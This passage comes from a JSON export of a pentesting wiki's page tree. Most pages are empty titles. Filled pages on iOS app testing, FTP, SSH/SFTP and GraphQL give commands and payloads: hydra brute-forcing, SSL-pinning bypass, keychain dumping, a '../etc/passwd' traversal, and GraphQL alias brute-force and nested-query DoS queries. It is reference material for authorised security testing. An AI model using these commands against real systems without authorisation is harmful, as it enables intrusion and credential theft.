       "slug": "ios-frida-configuration",
       "type": "page",
       "children": [],
       "tag": "TAG-0410",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS Hooking With Objection",
       "slug": "ios-hooking-with-objection",
       "type": "page",
       "children": [],
       "tag": "TAG-0411",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS Pentesting withuot Jailbreak",
       "slug": "ios-pentesting-withuot-jailbreak",
       "type": "page",
       "children": [],
       "tag": "TAG-0412",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS Protocol Handlers",
       "slug": "ios-protocol-handlers",
       "type": "page",
       "children": [],
       "tag": "TAG-0413",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS Serialisation and Encoding",
       "slug": "ios-serialisation-and-encoding",
       "type": "page",
       "children": [],
       "tag": "TAG-0414",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS Testing Environment",
       "slug": "ios-testing-environment",
       "type": "page",
       "children": [],
       "tag": "TAG-0415",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS UIActivity Sharing",
       "slug": "ios-uiactivity-sharing",
       "type": "page",
       "children": [],
       "tag": "TAG-0416",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS Universal Links",
       "slug": "ios-universal-links",
       "type": "page",
       "children": [],
       "tag": "TAG-0417",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS UIPasteboard",
       "slug": "ios-uipasteboard",
       "type": "page",
       "children": [],
       "tag": "TAG-0418",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS WebViews",
       "slug": "ios-webviews",
       "type": "page",
       "children": [],
       "tag": "TAG-0419",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Itunesstored Bookassetd Sandbox Escape",
       "slug": "itunesstored-bookassetd-sandbox-escape",
       "type": "page",
       "children": [],
       "tag": "TAG-0420",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Zero Click Messaging Image Parser Chains",
       "slug": "zero-click-messaging-image-parser-chains",
       "type": "page",
       "children": [],
       "tag": "TAG-0421",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0402",
     "content": "# iOS Application Pentesting\n\n## Environment\n- Jailbroken device (checkra1n/palera1n for physical, or a jailbroken simulator alternative like Corellium) is still the most reliable setup — non-jailbroken testing is possible but far more limited (no filesystem access, no runtime hooking without workarounds).\n- Install `frida-server` via Cydia/Sileo, or side-load for non-jailbroken with `objection`'s patched-IPA approach.\n\n## Static Analysis\n```bash\notool -L TargetApp                # linked libraries\nclass-dump TargetApp > classes.h  # Objective-C class/method dump\n# For Swift binaries, use a disassembler (Hopper/IDA/Ghidra) — class-dump won't work well\n```\nCheck `Info.plist` for:\n- `NSAppTransportSecurity` exceptions (ATS disabled = allows cleartext HTTP).\n- URL schemes registered (`CFBundleURLTypes`) — potential attack surface via inter-app communication.\n\n## Common Vulnerability Classes\n| Class | What to check |\n|---|---|\n| Insecure storage | Keychain misuse, NSUserDefaults storing sensitive data unencrypted, Core Data/SQLite unencrypted |\n| Transport security | ATS exceptions, missing certificate pinning |\n| IPC | Custom URL schemes accepting untrusted input, Universal Links validation |\n| Binary protections | Missing PIE, stack canaries, ARC — check with `otool -hv` and `otool -I -v` |\n| Jailbreak detection bypass | Frida hooks on common jailbreak-check methods (`fork()`, path existence checks for Cydia) |\n\n## Runtime Analysis (Frida on jailbroken device)\n```bash\nfrida -U -f com.target.app -l ssl-bypass.js --no-pause\nobjection -g com.target.app explore\nios sslpinning disable\nios keychain dump\n```\n\n## Filesystem Access (jailbroken)\n```bash\nssh root@<device-ip>\nfind /var/mobile/Containers/Data/Application -iname \"*.sqlite\" 2>/dev/null\n```\nLook inside the app's `Documents/` and `Library/` for cached credentials, tokens, or PII stored outside the Keychain.\n\n## Traffic Interception\nStandard Burp proxy config on device Wi-Fi settings + install Burp CA as a trusted root cert in Settings → General → About → Certificate Trust Settings. Combine with a Frida SSL-pinning bypass script since most modern apps pin certificates.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Cordova Apps",
     "slug": "cordova-apps",
     "type": "page",
     "children": [],
     "tag": "TAG-0422",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Xamarin Apps",
     "slug": "xamarin-apps",
     "type": "page",
     "children": [],
     "tag": "TAG-0423",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#F27D7D"
  },
  {
   "title": "👽 Network Services Pentesting",
   "slug": "network-services-pentesting",
   "type": "category",
   "children": [
    {
     "title": "4222 Pentesting Nats",
     "slug": "4222-pentesting-nats",
     "type": "page",
     "children": [],
     "tag": "TAG-0424",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Pentesting JDWP - Java Debug Wire Protocol",
     "slug": "pentesting-jdwp---java-debug-wire-protocol",
     "type": "page",
     "children": [],
     "tag": "TAG-0425",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Pentesting Printers",
     "slug": "pentesting-printers",
     "type": "page",
     "children": [],
     "tag": "TAG-0426",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Pentesting SAP",
     "slug": "pentesting-sap",
     "type": "page",
     "children": [],
     "tag": "TAG-0427",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Pentesting VoIP",
     "slug": "pentesting-voip",
     "type": "page",
     "children": [
      {
       "title": "Basic VoIP Protocols",
       "slug": "basic-voip-protocols",
       "type": "page",
       "children": [
        {
         "title": "SIP (Session Initiation Protocol)",
         "slug": "sip-session-initiation-protocol",
         "type": "page",
         "children": [],
         "tag": "TAG-0430",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0429",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0428",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Pentesting Remote GdbServer",
     "slug": "pentesting-remote-gdbserver",
     "type": "page",
     "children": [],
     "tag": "TAG-0431",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "7/tcp/udp - Pentesting Echo",
     "slug": "7tcpudp---pentesting-echo",
     "type": "page",
     "children": [],
     "tag": "TAG-0432",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "21 - Pentesting FTP",
     "slug": "21---pentesting-ftp",
     "type": "page",
     "children": [
      {
       "title": "FTP Bounce attack - Scan",
       "slug": "ftp-bounce-attack---scan",
       "type": "page",
       "children": [],
       "tag": "TAG-0434",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "FTP Bounce - Download 2ºFTP file",
       "slug": "ftp-bounce---download-2ftp-file",
       "type": "page",
       "children": [],
       "tag": "TAG-0435",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0433",
     "content": "# Pentesting FTP (Port 21)\n\n## Enumeration\n```bash\nnmap -sV -sC -p21 <target>\nnmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p21 <target>\n```\n\n## Anonymous Login (Check First, Always)\n```bash\nftp <target>\n# username: anonymous\n# password: anything (often blank or \"anonymous@\" by convention)\n```\nAnonymous FTP with **write** access is a critical finding on its own — often abusable for web shell upload if the FTP root overlaps with a web server's document root.\n\n## Banner Grabbing / Version Fingerprinting\n```bash\nnc -nv <target> 21\n```\nMatch the banner against known CVEs — vsftpd 2.3.4's backdoored version (CVE-2011-2523) is the classic CTF example, but always check the actual version in scope against current advisories.\n\n## Bounce Attack (Legacy, Rarely Works on Modern Servers)\nFTP's `PORT` command can be abused to make the FTP server itself connect to a third host on your behalf — historically used to port-scan internal hosts through an FTP server as a proxy. Mostly patched/disabled by default today, but worth a quick `ftp-bounce` nmap script check on legacy systems.\n\n## Brute Forcing\n```bash\nhydra -L users.txt -P passwords.txt ftp://<target>\n```\n\n## Common Findings Beyond Auth\n- [ ] Anonymous read access exposing sensitive files (backups, configs, source code)\n- [ ] Anonymous write access (upload to web root = RCE)\n- [ ] Cleartext credentials (FTP has no built-in encryption — pair with a PCAP capture if you have network position, plaintext creds are trivially sniffable)\n- [ ] Directory traversal in file retrieval (`RETR ../../../../etc/passwd`)\n- [ ] Outdated server software with known unauthenticated RCE\n\n## FTPS / SFTP Note\nDon't confuse plain FTP with **FTPS** (FTP-over-TLS, still port 21/990) or **SFTP** (an entirely different protocol running over SSH, port 22 — see the SSH page). If TLS is expected but not enforced, that's a downgrade-attack finding worth flagging.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "22 - Pentesting SSH/SFTP",
     "slug": "22---pentesting-sshsftp",
     "type": "page",
     "children": [],
     "tag": "TAG-0436",
     "content": "# Pentesting SSH / SFTP (Port 22)\n\n## Enumeration\n```bash\nnmap -sV -sC -p22 <target>\nssh -v <target>                    # banner + supported auth methods in verbose output\n```\n\n## Version & Config Fingerprinting\n```bash\nssh -Q cipher   -o Ciphers <target>       # not directly, but check ssh_config on a box you control for comparison\nnmap --script ssh2-enum-algos -p22 <target>\n```\nLook for weak/legacy algorithms still enabled (diffie-hellman-group1-sha1, arcfour ciphers, CBC-mode ciphers vulnerable to older padding attacks) — a finding even without full exploitation.\n\n## Authentication Methods Available\n```bash\nssh -o PreferredAuthentications=none <user>@<target>    # forces the server to list what it supports\n```\nCheck whether password auth is enabled at all — many hardened environments disable it in favor of key-only auth, which is itself worth confirming during recon (informs whether brute-forcing is even worth attempting).\n\n## Brute Forcing (Only If Password Auth Is In Scope and Enabled)\n```bash\nhydra -L users.txt -P passwords.txt ssh://<target> -t 4\n```\nKeep thread count low — SSH brute-forcing is easy to detect and easy to trigger fail2ban-style lockouts; a noisy scan can DoS legitimate access for the client.\n\n## Key-Based Auth Weaknesses\n- [ ] Weak/predictable host or user keys (historically an issue with certain embedded devices reusing factory-default keypairs across units — check the key fingerprint against known-bad databases).\n- [ ] Private keys exposed in backups, config management repos, or world-readable on disk from a prior compromise.\n- [ ] `authorized_keys` writable by a lower-privileged user than the account it grants access to (privesc path — see Linux Privilege Escalation Checklist).\n\n## SFTP-Specific Checks\n```bash\nsftp <user>@<target>\n```\n- Confirm the chroot jail (if configured) actually restricts navigation — misconfigured `ChrootDirectory` in `sshd_config` is a common way SFTP-only accounts end up able to read/write outside their intended directory.\n- Check whether SFTP-restricted accounts can still get a full shell via `ForceCommand` misconfiguration or forwarded ports (`AllowTcpForwarding` left enabled).\n\n## Post-Auth: Using SSH Access for Pivoting\nOnce you have valid SSH access (any level), it's immediately useful for tunneling — see the Tunneling & Port Forwarding page for local/remote/dynamic forwarding through this exact access.\n\n## Common Findings Checklist\n- [ ] Outdated SSH daemon version with known CVEs\n- [ ] Weak ciphers/MACs/KEX algorithms still enabled\n- [ ] Password auth enabled with weak/default credentials\n- [ ] Root login permitted directly (`PermitRootLogin yes`)\n- [ ] Overly permissive `authorized_keys` file permissions\n- [ ] SFTP chroot escape due to `ChrootDirectory` misconfiguration",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "23 - Pentesting Telnet",
     "slug": "23---pentesting-telnet",
     "type": "page",
     "children": [],
     "tag": "TAG-0437",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "25,465,587 - Pentesting SMTP/s",
     "slug": "25465587---pentesting-smtps",
     "type": "page",
     "children": [
      {
       "title": "SMTP Smuggling",
       "slug": "smtp-smuggling",
       "type": "page",
       "children": [],
       "tag": "TAG-0439",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "SMTP - Commands",
       "slug": "smtp---commands",
       "type": "page",
       "children": [],
       "tag": "TAG-0440",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0438",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "43 - Pentesting WHOIS",
     "slug": "43---pentesting-whois",
     "type": "page",
     "children": [],
     "tag": "TAG-0441",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "49 - Pentesting TACACS+",
     "slug": "49---pentesting-tacacs",
     "type": "page",
     "children": [],
     "tag": "TAG-0442",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "53 - Pentesting DNS",
     "slug": "53---pentesting-dns",
     "type": "page",
     "children": [],
     "tag": "TAG-0443",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "69/UDP TFTP/Bittorrent-tracker",
     "slug": "69udp-tftpbittorrent-tracker",
     "type": "page",
     "children": [],
     "tag": "TAG-0444",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "79 - Pentesting Finger",
     "slug": "79---pentesting-finger",
     "type": "page",
     "children": [],
     "tag": "TAG-0445",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "80,443 - Pentesting Web Methodology",
     "slug": "80443---pentesting-web-methodology",
     "type": "page",
     "children": [
      {
       "title": "403 & 401 Bypasses",
       "slug": "403-401-bypasses",
       "type": "page",
       "children": [],
       "tag": "TAG-0447",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "AEM - Adobe Experience Cloud",
       "slug": "aem---adobe-experience-cloud",
       "type": "page",
       "children": [],
       "tag": "TAG-0448",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Angular",
       "slug": "angular",
       "type": "page",
       "children": [],
       "tag": "TAG-0449",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Apache",
       "slug": "apache",
       "type": "page",
       "children": [],
       "tag": "TAG-0450",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Artifactory Hacking guide",
       "slug": "artifactory-hacking-guide",
       "type": "page",
       "children": [],
       "tag": "TAG-0451",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Bolt CMS",
       "slug": "bolt-cms",
       "type": "page",
       "children": [],
       "tag": "TAG-0452",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Buckets",
       "slug": "buckets",
       "type": "page",
       "children": [
        {
         "title": "Firebase Database",
         "slug": "firebase-database",
         "type": "page",
         "children": [],
         "tag": "TAG-0454",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0453",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "CGI",
       "slug": "cgi",
       "type": "page",
       "children": [],
       "tag": "TAG-0455",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Custom Protocols",
       "slug": "custom-protocols",
       "type": "page",
       "children": [],
       "tag": "TAG-0456",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Django",
       "slug": "django",
       "type": "page",
       "children": [],
       "tag": "TAG-0457",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Dotnet Soap Wsdl Client Exploitation",
       "slug": "dotnet-soap-wsdl-client-exploitation",
       "type": "page",
       "children": [],
       "tag": "TAG-0458",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "DotNetNuke (DNN)",
       "slug": "dotnetnuke-dnn",
       "type": "page",
       "children": [],
       "tag": "TAG-0459",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Drupal",
       "slug": "drupal",
       "type": "page",
       "children": [
        {
         "title": "Drupal RCE",
         "slug": "drupal-rce",
         "type": "page",
         "children": [],
         "tag": "TAG-0461",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0460",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Electron Desktop Apps",
       "slug": "electron-desktop-apps",
       "type": "page",
       "children": [
        {
         "title": "Electron contextIsolation RCE via preload code",
         "slug": "electron-contextisolation-rce-via-preload-code",
         "type": "page",
         "children": [],
         "tag": "TAG-0463",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Electron contextIsolation RCE via Electron internal code",
         "slug": "electron-contextisolation-rce-via-electron-internal-code",
         "type": "page",
         "children": [],
         "tag": "TAG-0464",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Electron contextIsolation RCE via IPC",
         "slug": "electron-contextisolation-rce-via-ipc",
         "type": "page",
         "children": [],
         "tag": "TAG-0465",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0462",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Flask",
       "slug": "flask",
       "type": "page",
       "children": [],
       "tag": "TAG-0466",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Fortinet Fortiweb",
       "slug": "fortinet-fortiweb",
       "type": "page",
       "children": [],
       "tag": "TAG-0467",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Git",
       "slug": "git",
       "type": "page",
       "children": [],
       "tag": "TAG-0468",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Golang",
       "slug": "golang",
       "type": "page",
       "children": [],
       "tag": "TAG-0469",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Grafana",
       "slug": "grafana",
       "type": "page",
       "children": [],
       "tag": "TAG-0470",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "GraphQL",
       "slug": "graphql",
       "type": "page",
       "children": [],
       "tag": "TAG-0471",
       "content": "# GraphQL Pentesting\n\n## Recon: Finding the Endpoint\nCommon paths: `/graphql`, `/graphql/console`, `/api/graphql`, `/v1/graphql`, `/query`. Check JS bundles for the endpoint if not obvious from the URL structure.\n\n## Introspection (The First Thing to Try)\nIf introspection is left enabled (common in non-production, sometimes forgotten in prod), you can pull the *entire* schema — every type, field, query, and mutation the API supports, including ones never exposed in the actual frontend UI.\n```graphql\n{\n  __schema {\n    types {\n      name\n      fields {\n        name\n      }\n    }\n  }\n}\n```\nTools that automate this and render it browsable: `GraphQL Voyager`, `InQL` (Burp extension), `graphql-cop`.\n\n## Common Vulnerability Classes\n| Class | What to check |\n|---|---|\n| Broken authorization | Query/mutate fields or objects a lower-privileged token shouldn't reach — same principle as REST IDOR, applied per-field |\n| Excessive data exposure | Nested queries returning far more fields than the UI ever displays |\n| Batching / DoS | Deeply nested or aliased queries multiplying backend cost (see below) |\n| Injection | Resolver code passing arguments unsanitized into SQL/NoSQL/shell calls downstream |\n| Information disclosure via errors | Verbose error messages leaking resolver internals, stack traces, or field-existence hints |\n\n## Query Batching / Aliasing DoS\nGraphQL lets a single request bundle many operations via aliases:\n```graphql\n{\n  a: login(user:\"admin\", pass:\"guess1\") { token }\n  b: login(user:\"admin\", pass:\"guess2\") { token }\n  c: login(user:\"admin\", pass:\"guess3\") { token }\n  # ... hundreds more in one request\n}\n```\nThis can bypass simple rate-limiting that only counts HTTP requests, not operations within a request — effectively free brute-force amplification if the backend doesn't separately rate-limit resolver calls.\n\n## Deeply Nested Query DoS\n```graphql\n{\n  user(id:1) {\n    friends {\n      friends {\n        friends {\n          friends { name }\n        }\n      }\n    }\n  }\n}\n```\nRecursive/self-referential nesting can make the backend do exponential work for linear-looking input — test for a query-depth/complexity limit.\n\n## Bypassing Disabled Introspection\nEven with introspection off, you can often reconstruct partial schema info via:\n- Error messages on malformed queries (field suggestion errors like \"did you mean `emailAddress`?\" leak real field names).\n- Brute-forcing common field/type names against the API and observing which succeed vs. return \"field not found.\"\n\n## Mutation Enumeration\nDon't stop at queries — mutations are where the real impact usually is (create/update/delete operations). Enumerate every mutation the schema exposes and test authorization on each independently, the same way you would for individual REST endpoints.\n\n## Prevention (for reports)\nDisable introspection in production, enforce query depth/complexity limits, apply field-level authorization (not just endpoint-level), and rate-limit based on query cost, not just raw request count.",
       "status": "complete",
       "updated": "2026-07-10"
      },
      {
       "title": "H2 - Java SQL database",
       "slug": "h2---java-sql-database",
       "type": "page",
       "children": [],
       "tag": "TAG-0472",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "IIS - Internet Information Services",
       "slug": "iis---internet-information-services",
       "type": "page",
       "children": [],
       "tag": "TAG-0473",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "ImageMagick Security",
       "slug": "imagemagick-security",
       "type": "page",
       "children": [],
       "tag": "TAG-0474",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ispconfig",
       "slug": "ispconfig",
       "type": "page",
       "children": [],
       "tag": "TAG-0475",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "JBOSS",
       "slug": "jboss",
       "type": "page",
       "children": [],
       "tag": "TAG-0476",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Jira & Confluence",
       "slug": "jira-confluence",
       "type": "page",
       "children": [],
       "tag": "TAG-0477",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Joomla",
       "slug": "joomla",
       "type": "page",
       "children": [],
       "tag": "TAG-0478",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "JSP",
       "slug": "jsp",
       "type": "page",
       "children": [],
       "tag": "TAG-0479",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Laravel",
       "slug": "laravel",
       "type": "page",
       "children": [],
       "tag": "TAG-0480",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Microsoft Sharepoint",
       "slug": "microsoft-sharepoint",
       "type": "page",
       "children": [],
       "tag": "TAG-0481",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Moodle",
       "slug": "moodle",
       "type": "page",
       "children": [],
       "tag": "TAG-0482",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "NextJS",
       "slug": "nextjs",
       "type": "page",
       "children": [],
       "tag": "TAG-0483",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Nginx",
       "slug": "nginx",
       "type": "page",
       "children": [],
       "tag": "TAG-0484",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "NodeJS Express",
       "slug": "nodejs-express",
       "type": "page",
       "children": [],
       "tag": "TAG-0485",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Sitecore",
       "slug": "sitecore",
       "type": "page",
       "children": [],
       "tag": "TAG-0486",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "PHP Tricks",
       "slug": "php-tricks",
       "type": "page",
       "children": [
        {
         "title": "PHP - Useful Functions & disable_functions/open_basedir bypass",
         "slug": "php---useful-functions-disablefunctionsopenbasedir-bypass",
         "type": "page",
         "children": [
          {
           "title": "disable_functions bypass - php-fpm/FastCGI",
           "slug": "disablefunctions-bypass---php-fpmfastcgi",
           "type": "page",
           "children": [],
           "tag": "TAG-0489",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "disable_functions bypass - dl function",
           "slug": "disablefunctions-bypass---dl-function",
           "type": "page",
           "children": [],
           "tag": "TAG-0490",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "disable_functions bypass - PHP 7.0-7.4 (\\-nix only)",
           "slug": "disablefunctions-bypass---php-70-74--nix-only",
           "type": "page",
           "children": [],
           "tag": "TAG-0491",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "disable_functions bypass - Imagick <= 3.3.0 PHP >= 5.4 Exploit",
           "slug": "disablefunctions-bypass---imagick-330-php-54-exploit",
           "type": "page",
           "children": [],
           "tag": "TAG-0492",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "disable_functions - PHP 5.x Shellshock Exploit",
           "slug": "disablefunctions---php-5x-shellshock-exploit",
           "type": "page",
           "children": [],
           "tag": "TAG-0493",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "disable_functions - PHP 5.2.4 ionCube extension Exploit",
           "slug": "disablefunctions---php-524-ioncube-extension-exploit",
           "type": "page",
           "children": [],
           "tag": "TAG-0494",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "disable_functions bypass - PHP <= 5.2.9 on windows",
           "slug": "disablefunctions-bypass---php-529-on-windows",
           "type": "page",
           "children": [],
           "tag": "TAG-0495",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "disable_functions bypass - PHP 5.2.4 and 5.2.5 PHP cURL",
           "slug": "disablefunctions-bypass---php-524-and-525-php-curl",
           "type": "page",
           "children": [],
           "tag": "TAG-0496",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "disable_functions bypass - PHP safe_mode bypass via proc_open() and custom environment Exploit",
           "slug": "disablefunctions-bypass---php-safemode-bypass-via-procopen-a",
           "type": "page",
           "children": [],
           "tag": "TAG-0497",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "disable_functions bypass - PHP Perl Extension Safe_mode Bypass Exploit",
           "slug": "disablefunctions-bypass---php-perl-extension-safemode-bypass",
           "type": "page",
           "children": [],
           "tag": "TAG-0498",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "disable_functions bypass - PHP 5.2.3 - Win32std ext Protections Bypass",
           "slug": "disablefunctions-bypass---php-523---win32std-ext-protections",
           "type": "page",
           "children": [],
           "tag": "TAG-0499",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "disable_functions bypass - PHP 5.2 - FOpen Exploit",
           "slug": "disablefunctions-bypass---php-52---fopen-exploit",
           "type": "page",
           "children": [],
           "tag": "TAG-0500",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "disable_functions bypass - via mem",
           "slug": "disablefunctions-bypass---via-mem",
           "type": "page",
           "children": [],
           "tag": "TAG-0501",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "disable_functions bypass - mod_cgi",
           "slug": "disablefunctions-bypass---modcgi",
           "type": "page",
           "children": [],
           "tag": "TAG-0502",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "disable_functions bypass - PHP 4 >= 4.2.0, PHP 5 pcntl_exec",
           "slug": "disablefunctions-bypass---php-4-420-php-5-pcntlexec",
           "type": "page",
           "children": [],
           "tag": "TAG-0503",
           "content": "",
           "status": "empty",
           "updated": null
          }
         ],
         "tag": "TAG-0488",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Php Rce Abusing Object Creation New Usd Get A Usd Get B",
         "slug": "php-rce-abusing-object-creation-new-usd-get-a-usd-get-b",
         "type": "page",
         "children": [],
         "tag": "TAG-0504",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "PHP SSRF",
         "slug": "php-ssrf",
         "type": "page",
         "children": [],
         "tag": "TAG-0505",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0487",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Perl Tricks",
       "slug": "perl-tricks",
       "type": "page",
       "children": [],
       "tag": "TAG-0506",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "PrestaShop",
       "slug": "prestashop",
       "type": "page",
       "children": [],
       "tag": "TAG-0507",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Python",
       "slug": "python",
       "type": "page",
       "children": [],
       "tag": "TAG-0508",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Rocket Chat",
       "slug": "rocket-chat",
       "type": "page",
       "children": [],
       "tag": "TAG-0509",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ruby Tricks",
       "slug": "ruby-tricks",
       "type": "page",
       "children": [],
       "tag": "TAG-0510",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Special HTTP headers",
       "slug": "special-http-headers",
       "type": "page",
       "children": [],
       "tag": "TAG-0511",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Source code Review / SAST Tools",
       "slug": "source-code-review-sast-tools",
       "type": "page",
       "children": [],
       "tag": "TAG-0512",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Special Http Headers",
       "slug": "special-http-headers-2",
       "type": "page",
       "children": [],
       "tag": "TAG-0513",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Roundcube",
       "slug": "roundcube",
       "type": "page",
       "children": [],
       "tag": "TAG-0514",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Spring Actuators",
       "slug": "spring-actuators",
       "type": "page",
       "children": [],
       "tag": "TAG-0515",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Symfony",
       "slug": "symfony",
       "type": "page",
       "children": [],
       "tag": "TAG-0516",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Tomcat",
       "slug": "tomcat",
       "type": "page",
       "children": [],
       "tag": "TAG-0517",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Telerik Ui Aspnet Ajax Unsafe Reflection Webresource Axd",
       "slug": "telerik-ui-aspnet-ajax-unsafe-reflection-webresource-axd",
       "type": "page",
       "children": [],
       "tag": "TAG-0518",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Uncovering CloudFlare",
       "slug": "uncovering-cloudflare",
       "type": "page",
       "children": [],
       "tag": "TAG-0519",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Vuejs",
       "slug": "vuejs",
       "type": "page",
       "children": [],
       "tag": "TAG-0520",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "VMWare (ESX, VCenter...)",
       "slug": "vmware-esx-vcenter",
       "type": "page",
       "children": [],
       "tag": "TAG-0521",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Web API Pentesting",
       "slug": "web-api-pentesting",
       "type": "page",
       "children": [],
       "tag": "TAG-0522",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "WebDav",
       "slug": "webdav",
